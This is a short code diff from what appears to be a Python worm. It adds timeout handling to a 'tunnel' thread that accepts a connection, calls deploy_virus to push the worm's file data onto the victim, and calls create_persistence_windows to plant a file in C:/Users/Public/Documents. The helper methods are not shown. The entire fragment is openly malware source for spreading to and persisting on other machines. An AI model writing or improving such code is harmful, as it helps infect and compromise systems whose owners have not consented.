@@ -16,20 +16,23 @@ class tunnel(threading.Thread):
     
     
     def run(self):
-        print("accepting traffic on port {}".format(self.lport))
-        conn, addr = self.sock.accept()
-        conn.settimeout(10)
-        self.set_connection(conn,addr)
-        print("Got a connection from: {}",addr)
-        
-        osplatform = "windows"
-        if osplatform == "windows":
-            dir = "C:/Users/Public/Documents"
-        else:
-            dir = "/tmp/"
-        self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
-        self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
-        conn.close()
+        try:
+            print("accepting traffic on port {}".format(self.lport))
+            conn, addr = self.sock.accept()
+            conn.settimeout(10)
+            self.set_connection(conn,addr)
+            print("Got a connection from: {}",addr)
+            
+            osplatform = "windows"
+            if osplatform == "windows":
+                dir = "C:/Users/Public/Documents"
+            else:
+                dir = "/tmp/"
+            self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
+            self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
+            conn.close()
+        except TimeoutError:
+            return False
     
     
     def sent_command(self, command, conn):
